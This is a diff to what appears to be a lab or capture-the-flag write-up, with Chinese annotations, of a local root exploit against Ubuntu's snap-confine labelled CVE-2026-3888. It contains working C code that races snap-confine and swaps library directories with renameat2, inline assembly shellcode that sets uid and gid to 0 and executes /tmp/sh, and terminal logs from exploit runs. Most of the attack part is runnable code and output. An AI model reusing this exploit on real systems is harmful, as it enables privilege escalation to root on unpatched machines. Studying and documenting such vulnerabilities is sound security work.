@@ -613,27 +613,27 @@ static int run_and_race(void) {
 						ringpos++;
 
 						if(!swapped && ringpos >= tlen) {
-						char check[512];
-						for (int i = 0; i < tlen && i < (int)sizeof(check) - 1; i++)
-								check[i] =ringbuf[(ringpos -tlen + i) % sizeof(ringbuf)];
-						check[tlen] = '\0';
+								char check[512];
+								for (int i = 0; i < tlen && i < (int)sizeof(check) - 1; i++)
+										check[i] =ringbuf[(ringpos -tlen + i) % sizeof(ringbuf)];
+								check[tlen] = '\0';
 
-						if (strstr(check, TRIGGER)) {
-								printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
+								if (strstr(check, TRIGGER)) {
+										printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
 
 
-								if (syscall (SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
+										if (syscall (SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
 												AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0){
-										/* atomic swap succeeded */
-								} else {
-										rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
-										rename(EXCHANGE_SRC, EXCHANGE_DST);
-								}
+											/* atomic swap succeeded */
+										} else {
+												rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
+												rename(EXCHANGE_SRC, EXCHANGE_DST);
+										}
 
-								swapped = 1;
-								printf("[*] SWAP DONE! Race won.\n");
-								printf("[*] Do NOT close this terminal.\n");
-						}
+										swapped = 1;
+										printf("[*] SWAP DONE! Race won.\n");
+										printf("[*] Do NOT close this terminal.\n");
+								}
 						}
 		}
 
@@ -660,6 +660,8 @@ int main(int argc, char *argv[]) {
 		printf("[*] CWD: "); fflush(stdout); system("pwd");
 		printf("[*] Setting up .snap and .exchange directiry...\n");
 		if (setup_snap_and_exchange(argv[1]) < 0) return 1;
+		printf("[*] Starting race against snap-confine...\n");
+		if (run_and_race() < 0) return 1;
 		printf("[+] Done. Re-enter sandbox to exploit.\n");
 		return 0;
 }
@@ -685,7 +687,7 @@ void _start(void) {
 						"mov $0x71, %%rax\n"
 						"syscall\n"
 						::: "rax", "rdi", "rsi"
-					 );
+		);
 
 		/* setregid(0, 0) */
 		__asm__ volatile (
@@ -694,7 +696,7 @@ void _start(void) {
 						"mov $0x72, %%rax\n"
 						"syscall\n"
 						::: "rax", "rdi", "rsi"
-					 );
+		);
 
 		/* execve("/tmp/sh", {"/tmp/sh", NULL} ,NULL) */
 		__asm__ volatile(
@@ -708,7 +710,7 @@ void _start(void) {
 						"mov $0x3b, %%rax\n"
 						"syscall\n"
 						::: "rax", "rdi", "rsi", "rdx"
-					);
+		);
 }
 ```
 </details>
@@ -744,12 +746,32 @@ jonathan@snapped:/proc/4124/cwd$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snap
 cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_gE21im//dev: No such file or directory
 ```
 ```
-jonathan@snapped:/proc/4124/cwd$ ~/firefox_2404 ~/payload.so
+jonathan@snapped:/proc/3517/cwd$ ~/firefox_2404 ~/paylaod.so
 [*] CVE-2026-3888 - firefox 24.04 helper
-[*] CWD: /proc/4124/cwd
+[*] CWD: /proc/3517/cwd
 [*] Setting up .snap and .exchange directiry...
 [*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
-[+] Done. Re-enter sandbox to exploit.
+[*] Starting race against snap-confine...
+[*] Reading snap-confine output (PID 5190)...
+<SNIP>
+DEBUG: cannot open path of the original working directory /tmp (deleted)	//snap 把 /tmp 变成了“虚空目录（void dir）
+DEBUG: the process has been placed in the special void directory
+DEBUG: -- snap startup {"stage":"snap-confine to snap-exec", "time":"1775981401.041731"}
+/bin/sh: 1: cannot create /tmp/race_pid.txt: Directory nonexistent
+/bin/sh: 1: cannot create /tmp/race_perms.txt: Directory nonexistent
+```
+#### 换个目录
+```
+execl(SNAP_CONFINE, "snap-confine",
+								"--base", "core22",
+								"snap.firefox.hook.configure",
+								"/bin/sh", "-c",
+								"echo $$ > /home/jonathan/race_pid.txt; "
+								"stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
+								"> /home/jonathan/race_perms.txt 2>&1; "
+								"sleep 99994",
+								NULL);
+				_exit(1);
 ```
 #### Step 4 — Destroy cached namespace 
 #### Step 5 — Win the race 
